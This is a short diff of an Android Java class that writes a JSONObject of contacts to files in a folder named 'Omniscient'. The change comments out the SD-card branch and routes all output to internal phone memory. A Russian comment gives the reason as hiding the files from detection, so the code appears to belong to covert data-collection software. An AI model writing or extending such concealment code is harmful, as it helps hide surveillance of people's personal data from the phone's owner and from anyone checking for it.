@@ -27,37 +27,38 @@ public class WriteToJsonFile {
     }
    public void writeFileSD(JSONObject contacts, String fileName,String folder) {
         // проверяем доступность SD
-        if (!Environment.getExternalStorageState().equals(
-                Environment.MEDIA_MOUNTED)) {
-            Log.d("MyMsg", "SD-карта не доступна: " + Environment.getExternalStorageState());
+//        if (!Environment.getExternalStorageState().equals(
+//                Environment.MEDIA_MOUNTED)) {
+//            Log.d("MyMsg", "SD-карта не доступна: " + Environment.getExternalStorageState());
+       //пишем только в память телефона что бы скрыть файлы от обнаружения
             writeFileToPhoneMemory(contacts, fileName, folder);
-            return;
-        }
-       Long time = System.currentTimeMillis();
-        // получаем путь к SD
-        File sdPath = Environment.getExternalStorageDirectory();
-        // добавляем свой каталог к пути
-        sdPath = new File(sdPath.getAbsolutePath() + "/" + "Omniscient" +"/" +folder);//DIR_SD);
-        // создаем каталог
-        sdPath.mkdirs();
-        // формируем объект File, который содержит путь к файлу
-       String bTime = new SimpleDateFormat("dd_MM_yyyy_HH-mm")
-               .format(time);
-       // File sdFile = new File(sdPath, time + fileName);//FILENAME_SD);
-        File sdFile = new File(sdPath, bTime + fileName);//FILENAME_SD);
-        try {
-            // открываем поток для записи
-            BufferedWriter bw = new BufferedWriter(new FileWriter(sdFile));
-            // пишем данные
-            bw.write(contacts.toString());//"Содержимое файла на SD");
-            // закрываем поток
-            bw.close();
-            Log.d("MyMsg", "Файл записан на SD: " + sdFile.getAbsolutePath());
-            Log.v("MyMsg","date) " + new SimpleDateFormat("dd/MM/yyyy HH:mm")
-                    .format(time));
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
+//            return;
+//        }
+//       Long time = System.currentTimeMillis();
+//        // получаем путь к SD
+//        File sdPath = Environment.getExternalStorageDirectory();
+//        // добавляем свой каталог к пути
+//        sdPath = new File(sdPath.getAbsolutePath() + "/" + "Omniscient" +"/" +folder);//DIR_SD);
+//        // создаем каталог
+//        sdPath.mkdirs();
+//        // формируем объект File, который содержит путь к файлу
+//       String bTime = new SimpleDateFormat("dd_MM_yyyy_HH-mm")
+//               .format(time);
+//       // File sdFile = new File(sdPath, time + fileName);//FILENAME_SD);
+//        File sdFile = new File(sdPath, bTime + fileName);//FILENAME_SD);
+//        try {
+//            // открываем поток для записи
+//            BufferedWriter bw = new BufferedWriter(new FileWriter(sdFile));
+//            // пишем данные
+//            bw.write(contacts.toString());//"Содержимое файла на SD");
+//            // закрываем поток
+//            bw.close();
+//            Log.d("MyMsg", "Файл записан на SD: " + sdFile.getAbsolutePath());
+//            Log.v("MyMsg","date) " + new SimpleDateFormat("dd/MM/yyyy HH:mm")
+//                    .format(time));
+//        } catch (IOException e) {
+//            e.printStackTrace();
+//        }
     }
     private void writeFileToPhoneMemory(JSONObject contacts, String fileName,String folder){
 
